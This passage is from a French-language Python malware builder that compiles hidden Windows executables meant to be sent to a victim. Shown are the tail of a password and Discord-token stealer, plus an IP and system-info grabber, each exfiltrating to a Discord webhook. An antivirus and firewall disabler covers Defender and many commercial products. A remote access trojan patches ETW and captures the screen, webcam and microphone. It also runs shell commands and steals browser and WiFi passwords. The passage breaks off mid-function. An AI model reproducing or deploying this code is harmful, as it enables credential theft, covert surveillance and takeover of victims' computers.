        if not bdata["tokens"]:
            continue
        token_lines.append(f"\n__**{bname}**__ ({len(bdata['tokens'])} tokens)")
        for t in bdata["tokens"]:
            token_lines.append(f"`{t}`")
    if token_lines:
        send_embed(f"Discord Tokens ({total_tokens})", "\n".join(token_lines), color=0x5865F2)

    resume = (
        f"**Passwords** : {total_pw}\n"
        f"**Cookies** : {total_cks}\n"
        f"**Cartes** : {total_cards}\n"
        f"**Tokens Discord** : {total_tokens}\n"
        f"**Navigateurs** : {', '.join(all_data['browsers'].keys()) or 'aucun'}"
    )
    send_embed("Résumé Password Stealer", resume, color=0x8B0000)

    try:
        tmp_json = os.path.join(TEMP, f"stealer_{os.getpid()}.json")
        with open(tmp_json, "w", encoding="utf-8") as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        send_file(tmp_json, "passwords_full.json")
        os.remove(tmp_json)
    except Exception:
        pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = source.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_pw_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_pw")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "password_stealer",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=win32crypt",
        "--hidden-import=Crypto.Cipher",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "password_stealer.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie password_stealer.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "password_stealer.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#                     OPTION 10 — IP GRABBER
# ============================================================

def option_10():
    clear()
    banner()

    print(f"\n{CYAN}   [ IP GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    grabber_code = r'''import os, sys, json, socket, platform, subprocess, uuid, ctypes
from datetime import datetime
import requests

WEBHOOK = "__WEBHOOK_URL__"

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def get_public_ip():
    for url in ("https://api.ipify.org?format=json", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            r = HTTP.get(url, timeout=5)
            if "json" in url:
                return r.json().get("ip", "?")
            return r.text.strip()
        except Exception:
            continue
    return "Unknown"

def get_local_ips():
    ips = []
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    return ips

def get_geo(ip):
    try:
        r = HTTP.get(
            f"http://ip-api.com/json/{ip}"
            "?fields=status,country,countryCode,regionName,city,zip,"
            "lat,lon,timezone,isp,org,as,asname,reverse,proxy,hosting,mobile,query",
            timeout=8,
        )
        data = r.json()
        if data.get("status") == "success":
            return data
    except Exception:
        pass
    return {}

def get_mac():
    try:
        mac = uuid.getnode()
        return ":".join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
    except Exception:
        return "Unknown"

def get_sysinfo():
    try:
        user = os.getlogin()
    except Exception:
        user = os.getenv("USERNAME", "Unknown")

    boot = "Unknown"
    try:
        r = subprocess.check_output(
            ["wmic", "os", "get", "lastbootuptime"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        if len(r) >= 2:
            boot = r[1].strip()
    except Exception:
        pass

    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": f"{platform.system()} {platform.release()}",
        "os_version": platform.version(),
        "arch": platform.machine(),
        "processor": platform.processor(),
        "boot_time": boot,
        "mac": get_mac(),
        "cwd": os.getcwd(),
        "python": platform.python_version(),
        "timestamp": datetime.now().isoformat(),
    }

def get_gpu():
    try:
        out = subprocess.check_output(
            ["wmic", "path", "win32_VideoController", "get", "name"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        return [l.strip() for l in out[1:] if l.strip()]
    except Exception:
        return []

def get_cpu():
    try:
        out = subprocess.check_output(
            ["wmic", "cpu", "get", "name"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        return [l.strip() for l in out[1:] if l.strip()]
    except Exception:
        return []

def get_ram():
    try:
        out = subprocess.check_output(
            ["wmic", "ComputerSystem", "get", "TotalPhysicalMemory"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        if len(out) >= 2:
            b = int(out[1].strip())
            return f"{b / (1024**3):.1f} GB"
    except Exception:
        pass
    return "Unknown"

def get_disks():
    try:
        out = subprocess.check_output(
            ["wmic", "logicaldisk", "get", "DeviceID,Size,FreeSpace"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore").splitlines()
        disks = []
        for line in out[1:]:
            parts = line.split()
            if len(parts) == 3:
                dev, free, size = parts
                try:
                    disks.append({
                        "drive": dev,
                        "size_gb": round(int(size) / (1024**3), 1),
                        "free_gb": round(int(free) / (1024**3), 1),
                    })
                except Exception:
                    pass
        return disks
    except Exception:
        return []

def get_installed_browsers():
    browsers = []
    local = os.getenv("LOCALAPPDATA", "")
    appdata = os.getenv("APPDATA", "")
    for name, path in {
        "Chrome": os.path.join(local, "Google", "Chrome", "Application", "chrome.exe"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "Application", "msedge.exe"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        "Firefox": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable", "opera.exe"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable", "opera.exe"),
        "Vivaldi": os.path.join(local, "Vivaldi", "Application", "vivaldi.exe"),
        "Discord": os.path.join(local, "Discord", "Update.exe"),
    }.items():
        if os.path.exists(path):
            browsers.append(name)
    return browsers

def send_embed(title, fields, color=0x2C2F33):
    try:
        HTTP.post(WEBHOOK, json={
            "embeds": [{
                "title": title,
                "color": color,
                "fields": fields,
                "timestamp": datetime.utcnow().isoformat(),
            }]
        }, timeout=15)
    except Exception:
        pass

def main():
    pub_ip = get_public_ip()
    geo = get_geo(pub_ip)
    sysinfo = get_sysinfo()
    local_ips = get_local_ips()
    gpus = get_gpu()
    cpus = get_cpu()
    ram = get_ram()
    disks = get_disks()
    browsers = get_installed_browsers()

    ip_fields = [
        {"name": "Public IP", "value": f"`{pub_ip}`", "inline": True},
        {"name": "Local IPs", "value": "`" + ", ".join(local_ips[:5]) + "`" if local_ips else "N/A", "inline": True},
        {"name": "MAC", "value": f"`{sysinfo['mac']}`", "inline": True},
        {"name": "Country", "value": f"{geo.get('country', 'N/A')} ({geo.get('countryCode', '?')})", "inline": True},
        {"name": "Region", "value": geo.get("regionName", "N/A"), "inline": True},
        {"name": "City", "value": geo.get("city", "N/A"), "inline": True},
        {"name": "ZIP", "value": geo.get("zip", "N/A"), "inline": True},
        {"name": "Timezone", "value": geo.get("timezone", "N/A"), "inline": True},
        {"name": "Coords", "value": f"`{geo.get('lat', '?')}, {geo.get('lon', '?')}`", "inline": False},
        {"name": "ISP", "value": geo.get("isp", "N/A"), "inline": False},
        {"name": "Org", "value": geo.get("org", "N/A"), "inline": False},
        {"name": "ASN", "value": geo.get("as", "N/A"), "inline": False},
        {"name": "Reverse DNS", "value": geo.get("reverse", "N/A"), "inline": False},
        {"name": "Type", "value": (
            ("VPN/Proxy " if geo.get("proxy") else "")
            + ("Hosting " if geo.get("hosting") else "")
            + ("Mobile" if geo.get("mobile") else "")
            or "Residential"
        ), "inline": False},
    ]
    send_embed(f"IP Grabber — {sysinfo['hostname']}", ip_fields, color=0x8B0000)

    sys_fields = [
        {"name": "Hostname", "value": f"`{sysinfo['hostname']}`", "inline": True},
        {"name": "User", "value": f"`{sysinfo['username']}`", "inline": True},
        {"name": "OS", "value": f"{sysinfo['os']} ({sysinfo['arch']})", "inline": True},
        {"name": "OS Version", "value": f"`{sysinfo['os_version']}`", "inline": False},
        {"name": "CPU", "value": "```" + "\n".join(cpus) + "```" if cpus else "N/A", "inline": False},
        {"name": "GPU", "value": "```" + "\n".join(gpus) + "```" if gpus else "N/A", "inline": False},
        {"name": "RAM", "value": ram, "inline": True},
        {"name": "CWD", "value": f"`{sysinfo['cwd']}`", "inline": False},
        {"name": "Python", "value": sysinfo["python"], "inline": True},
        {"name": "Boot time", "value": f"`{sysinfo['boot_time']}`", "inline": False},
    ]
    send_embed("System Info", sys_fields, color=0x2C2F33)

    extra_fields = []
    if disks:
        disk_lines = [f"`{d['drive']}` {d['free_gb']}/{d['size_gb']} GB free" for d in disks]
        extra_fields.append({"name": "Disks", "value": "\n".join(disk_lines), "inline": False})
    if browsers:
        extra_fields.append({"name": "Browsers installed", "value": "`" + ", ".join(browsers) + "`", "inline": False})

    if extra_fields:
        send_embed("Storage & Software", extra_fields, color=0x36393F)

    full = {
        "ip": pub_ip,
        "geo": geo,
        "system": sysinfo,
        "local_ips": local_ips,
        "gpus": gpus,
        "cpus": cpus,
        "ram": ram,
        "disks": disks,
        "browsers": browsers,
    }
    try:
        tmp = os.path.join(os.getenv("TEMP", "."), f"ip_{os.getpid()}.json")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(full, f, indent=2, ensure_ascii=False)
        with open(tmp, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": ("ip_full.json", f.read(), "application/json")}, timeout=30)
        os.remove(tmp)
    except Exception:
        pass

if __name__ == "__main__":
    main()
'''

    src = grabber_code.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_ipgrabber_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_ipgrabber")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "ip_grabber",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "ip_grabber.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie ip_grabber.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "ip_grabber.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#           OPTION 11 — AV DISABLE BUILDER
# ============================================================

def option_11():
    clear()
    banner()

    AVS = {
        "1":  ("Windows Defender", "defender"),
        "2":  ("Malwarebytes", "malwarebytes"),
        "3":  ("Avast", "avast"),
        "4":  ("AVG", "avg"),
        "5":  ("Kaspersky", "kaspersky"),
        "6":  ("Bitdefender", "bitdefender"),
        "7":  ("Norton", "norton"),
        "8":  ("McAfee", "mcafee"),
        "9":  ("ESET", "eset"),
        "10": ("Sophos", "sophos"),
        "11": ("Trend Micro", "trendmicro"),
        "12": ("Panda", "panda"),
        "13": ("Webroot", "webroot"),
        "14": ("F-Secure", "fsecure"),
        "15": ("G Data", "gdata"),
        "16": ("Comodo", "comodo"),
        "17": ("360 Total Security", "360"),
        "18": ("Windows Firewall", "firewall"),
        "19": ("Windows SmartScreen", "smartscreen"),
        "20": ("Windows Update", "windowsupdate"),
    }

    print(f"\n{CYAN}   [ AV DISABLER BUILDER ]{RESET}\n")
    for k, (n, _) in AVS.items():
        print(f"  {k:>2}. {n}")
    print(f"\n{GRAY}Exemple : 1,2,5  ou  all{RESET}")

    choice = input(f"{YELLOW}[?]{RESET} > ").strip().lower()
    if choice == "all":
        ids = list(AVS.keys())
    else:
        ids = [c.strip() for c in choice.split(",") if c.strip() in AVS]

    if not ids:
        print(f"{RED}[!] Aucun choix valide.{RESET}")
        pause()
        return

    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL (vide = pas de report) -> ").strip()
    send_report = webhook.startswith("https://discord.com/api/webhooks/")

    clefs = [AVS[i][1] for i in ids]
    noms = [AVS[i][0] for i in ids]

    source = r'''# auto-genere par mytool.py
# cibles : __TARGETS__
# lancer en ADMINISTRATEUR
import subprocess, sys, ctypes, os, json, platform, socket
from datetime import datetime

WEBHOOK = "__WEBHOOK_URL__"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate():
    if is_admin():
        return True
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join(f'"{a}"' for a in sys.argv),
            None, 1
        )
    except Exception:
        pass
    return False

def run(cmd):
    try:
        subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    except Exception:
        pass

def disable_defender():
    run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"')
    run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"')
    run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"')
    run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"')
    run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"')
    run('powershell -Command "Set-MpPreference -MAPSReporting 0"')
    cmds = [
        "sc stop WinDefend", "sc config WinDefend start= disabled",
        "sc stop WdNisSvc", "sc config WdNisSvc start= disabled",
        "sc stop Sense", "sc config Sense start= disabled",
        "sc stop SecurityHealthService", "sc config SecurityHealthService start= disabled",
        "sc stop wscsvc", "sc config wscsvc start= disabled",
        "sc stop MsMpEng", "sc config MsMpEng start= disabled",
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f',
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
        r'schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable',
        r'schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable',
    ]
    for c in cmds:
        run(c)

def disable_firewall():
    cmds = [
        "netsh advfirewall set allprofiles state off",
        "netsh firewall set opmode disable",
        "sc stop mpssvc", "sc config mpssvc start= disabled",
        "sc stop BFE", "sc config BFE start= disabled",
        "sc stop MpsSvc", "sc config MpsSvc start= disabled",
    ]
    for c in cmds:
        run(c)

def disable_malwarebytes():
    for proc in ("mbam.exe", "mbamtray.exe", "MBAMService.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop MBAMService", "sc config MBAMService start= disabled"]:
        run(c)

def disable_avast():
    for proc in ("AvastSvc.exe", "AvastUI.exe", "aswidsagent.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AvastSvc", "sc config AvastSvc start= disabled"]:
        run(c)

def disable_avg():
    for proc in ("avgui.exe", "avgsvc.exe", "avgwdsvc.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AVG Antivirus", "sc config AVG Antivirus start= disabled"]:
        run(c)

def disable_kaspersky():
    for proc in ("avp.exe", "avpui.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop AVP", "sc config AVP start= disabled"]:
        run(c)

def disable_bitdefender():
    for proc in ("vsserv.exe", "bdagent.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop VSSERV", "sc config VSSERV start= disabled"]:
        run(c)

def disable_norton():
    for proc in ("nortonsecurity.exe", "nortonsecurityui.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop NortonSecurity", "sc config NortonSecurity start= disabled"]:
        run(c)

def disable_mcafee():
    for proc in ("mcshield.exe", "mcafeefire.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop McAfeeEngineService", "sc config McAfeeEngineService start= disabled"]:
        run(c)

def disable_eset():
    for proc in ("egui.exe", "ekrn.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop ekrn", "sc config ekrn start= disabled"]:
        run(c)

def disable_sophos():
    for proc in ("SophosUI.exe", "SophosFileScanner.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop SophosAgent", "sc config SophosAgent start= disabled"]:
        run(c)

def disable_trendmicro():
    for proc in ("tmntsrv.exe", "tmccsf.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop Amsp", "sc config Amsp start= disabled"]:
        run(c)

def disable_panda():
    for proc in ("PSANHost.exe",):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop PSANHost", "sc config PSANHost start= disabled"]:
        run(c)

def disable_webroot():
    for proc in ("WRSA.exe", "WRSVC.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop WRSVC", "sc config WRSVC start= disabled"]:
        run(c)

def disable_fsecure():
    for proc in ("fsui.exe", "fsservice.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop F-Secure Hoster", "sc config F-Secure Hoster start= disabled"]:
        run(c)

def disable_gdata():
    for proc in ("AVK.exe",):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop G DATA AntiVirus Engine", "sc config G DATA AntiVirus Engine start= disabled"]:
        run(c)

def disable_comodo():
    for proc in ("cmdagent.exe", "cavwp.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop cmdAgent", "sc config cmdAgent start= disabled"]:
        run(c)

def disable_360():
    for proc in ("360tray.exe", "360rp.exe", "ZhuDongFangYu.exe"):
        run(f"taskkill /F /IM {proc} /T")
    for c in ["sc stop 360rp", "sc config 360rp start= disabled"]:
        run(c)

def disable_smartscreen():
    cmds = [
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f',
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f',
    ]
    for c in cmds:
        run(c)

def disable_windowsupdate():
    cmds = [
        "sc stop wuauserv", "sc config wuauserv start= disabled",
        "sc stop UsoSvc", "sc config UsoSvc start= disabled",
        "sc stop BITS", "sc config BITS start= disabled",
    ]
    for c in cmds:
        run(c)

def report(targets):
    if not WEBHOOK or not WEBHOOK.startswith("http"):
        return
    import requests
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    embed = {
        "title": "AV Disabler Report",
        "color": 0x8B0000,
        "fields": [
            {"name": "Hostname", "value": f"`{socket.gethostname()}`", "inline": True},
            {"name": "User", "value": f"`{user}`", "inline": True},
            {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
            {"name": "IP", "value": f"`{ip}`", "inline": True},
            {"name": "Cibles", "value": "`" + ", ".join(targets) + "`", "inline": False},
            {"name": "Timestamp", "value": datetime.now().isoformat(), "inline": False},
        ]
    }
    try:
        requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=10)
    except Exception:
        pass

def main():
    if not is_admin():
        if elevate():
            sys.exit(0)
        else:
            sys.exit(1)

    targets = __TARGET_LIST__

    for t in targets:
        fn = globals().get(f"disable_{t}")
        if callable(fn):
            try:
                fn()
            except Exception:
                pass

    report(targets)

if __name__ == "__main__":
    main()
'''

    targets_repr = repr(clefs)
    src = source.replace("__TARGET_LIST__", targets_repr)
    src = src.replace("__TARGETS__", ", ".join(noms))
    src = src.replace("__WEBHOOK_URL__", webhook if send_report else "")

    tmp = _safe_tmp("_avdisable_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_avdisable")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "av_disable",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--uac-admin",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "av_disable.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{CYAN}[i] Cibles : {', '.join(noms)}{RESET}")
    if send_report:
        print(f"{GRAY}[i] Report Discord active.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "av_disable.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#         OPTION 12 — RAT BUILDER
# ============================================================

def option_12():
    clear()
    banner()

    print(f"\n{CYAN}   [ RAT BUILDER — Discord backend ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL (reception) -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    bot_token = input(f"{YELLOW}[?]{RESET} Bot token (commandes) -> ").strip()
    channel_id = input(f"{YELLOW}[?]{RESET} Channel ID (commandes) -> ").strip()
    if not bot_token or not channel_id:
        print(f"{RED}[!] Bot token ou channel ID manquant.{RESET}")
        pause()
        return

    icon = input(f"{YELLOW}[?]{RESET} Chemin .ico (vide = aucun) -> ").strip() or None
    output = input(f"{YELLOW}[?]{RESET} Nom de sortie (ex: svchost) -> ").strip() or "svchost"

    bot_source = r'''import os, sys, json, time, base64, zipfile, tempfile, subprocess, shutil
import socket, platform, getpass, ctypes
from datetime import datetime

WEBHOOK = "__WEBHOOK__"
BOT_TOKEN = "__BOT_TOKEN__"
CHANNEL_ID = "__CHANNEL_ID__"
API = "https://discord.com/api/v10"
HEADERS = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
POLL_INTERVAL = 5
SEEN_IDS = set()
BOT_ID = platform.node() + "-" + getpass.getuser()

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "requests"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
    import requests

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def wh_send(content=None, embed=None, file_path=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                HTTP.post(WEBHOOK, files={"file": (os.path.basename(file_path), f.read())},
                          data={"content": content or ""}, timeout=60)
        elif embed:
            HTTP.post(WEBHOOK, json={"embeds": [embed]}, timeout=15)
        elif content:
            HTTP.post(WEBHOOK, json={"content": content[:1900]}, timeout=15)
    except Exception:
        pass

def wh_embed(title, description, color=0x8B0000, fields=None):
    e = {"title": title, "description": description[:4000], "color": color,
         "timestamp": datetime.utcnow().isoformat()}
    if fields:
        e["fields"] = fields
    try:
        HTTP.post(WEBHOOK, json={"embeds": [e]}, timeout=15)
    except Exception:
        pass

def fetch_msgs():
    try:
        r = HTTP.get(f"{API}/channels/{CHANNEL_ID}/messages?limit=5",
                     headers=HEADERS, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return []

def get_sysinfo():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "ip": ip,
        "cwd": os.getcwd(),
        "pid": os.getpid(),
        "timestamp": datetime.now().isoformat(),
    }

def cmd_info():
    i = get_sysinfo()
    fields = [{"name": k, "value": f"`{v}`", "inline": True} for k, v in i.items()]
    wh_embed(f"Info — {BOT_ID}", "System info", 0x2C2F33, fields)

def cmd_screen():
    try:
        import mss, mss.tools
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            tmp = tempfile.mktemp(suffix=".png")
            mss.tools.to_png(img.rgb, img.size, output=tmp)
            wh_send(file_path=tmp, content=f"**Screen** — {BOT_ID}")
            os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[screen] {e}")

def cmd_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            wh_send(content="[webcam] pas de camera")
            return
        tmp = tempfile.mktemp(suffix=".jpg")
        cv2.imwrite(tmp, frame)
        wh_send(file_path=tmp, content=f"**Webcam** — {BOT_ID}")
        os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[webcam] {e}")

def cmd_micro(seconds=10):
    try:
        import sounddevice as sd
        import scipy.io.wavfile as wav
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()
        tmp = tempfile.mktemp(suffix=".wav")
        wav.write(tmp, fs, rec)
        wh_send(file_path=tmp, content=f"**Micro {seconds}s** — {BOT_ID}")
        os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[micro] {e}")

def cmd_shell(arg):
    try:
        r = subprocess.run(arg, shell=True, capture_output=True, text=True, timeout=60)
        out = (r.stdout + r.stderr)[:4000] or "[pas de sortie]"
        wh_embed("Shell", f"```\n{out}\n```", 0x8B0000,
                 [{"name": "cmd", "value": f"`{arg[:200]}`", "inline": False}])
    except Exception as e:
        wh_send(content=f"[shell] {e}")

def cmd_creds():
    import sqlite3, win32crypt
    out = []
    paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
    ]
    for p in paths:
        if not os.path.exists(p):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(p, tmp)
            con = sqlite3.connect(tmp)
            for url, user, enc in con.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 50"):
                try:
                    pwd = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                except Exception:
                    pwd = "<enc>"
                out.append(f"{url[:80]} | {user} | {pwd}")
            con.close()
        except Exception:
            pass
        finally:
            try: os.remove(tmp)
            except: pass
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                r2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True)
                for l2 in r2.stdout.splitlines():
                    if "Key Content" in l2:
                        out.append(f"[WiFi] {name} | {l2.split(':', 1)[1].strip()}")
    except Exception:
        pass
    if out:
